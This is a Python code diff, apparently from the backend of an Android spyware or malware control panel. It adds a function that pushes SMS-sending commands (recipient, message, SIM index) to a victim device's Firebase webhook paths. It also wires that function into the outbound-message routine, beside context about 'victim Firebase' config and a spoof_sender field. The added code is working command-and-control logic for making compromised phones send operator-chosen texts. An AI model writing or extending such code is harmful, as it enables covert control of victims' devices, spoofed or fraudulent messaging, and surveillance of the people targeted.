@@ -184,6 +184,34 @@ def _outgoing_webhook_paths(base: str, device_id: str) -> list[str]:
     return paths
 
 
+async def push_channel_webhook_sms(
+    firebase_url: str,
+    device: Device,
+    to_number: str,
+    message: str,
+    sim_index: int = 0,
+) -> bool:
+    """Auto-token fast path — single PATCH webhook (~0.1s), selected SIM index."""
+    base = normalize_firebase_url(firebase_url)
+    payload = {
+        "from": sim_index,
+        "to": to_number,
+        "message": message,
+        "isSended": False,
+    }
+    device_ids = _outgoing_device_ids(device)
+    primary = device_ids[0] if device_ids else device.name
+    urls = _outgoing_webhook_paths(base, primary)
+    results = await asyncio.gather(
+        *(_firebase_patch_ok(url, payload, timeout=1.2) for url in urls),
+        return_exceptions=True,
+    )
+    if any(result is True for result in results):
+        logger.info("Channel webhook queued device=%s to=%s sim=%s", primary, to_number, sim_index)
+        return True
+    return False
+
+
 async def push_virtus_apk_config(profile: MonitorProfile, device: Device | None = None) -> None:
     """Write APK-readable config on victim Firebase (config/{KEY} + virtus_config.json)."""
     firebase_url = resolve_apk_firebase_url(profile, device)
@@ -473,6 +501,14 @@ async def push_outbound_to_firebase(
                 outbound.spoof_sender,
                 outbound.message,
             )
+        if await push_channel_webhook_sms(
+            firebase_url,
+            device,
+            outbound.to_number,
+            outbound.message,
+            sim_index=outbound.sim_index or 0,
+        ):
+            return "webhook"
         return await push_outgoing_sms_command(
             firebase_url,
             device.name,
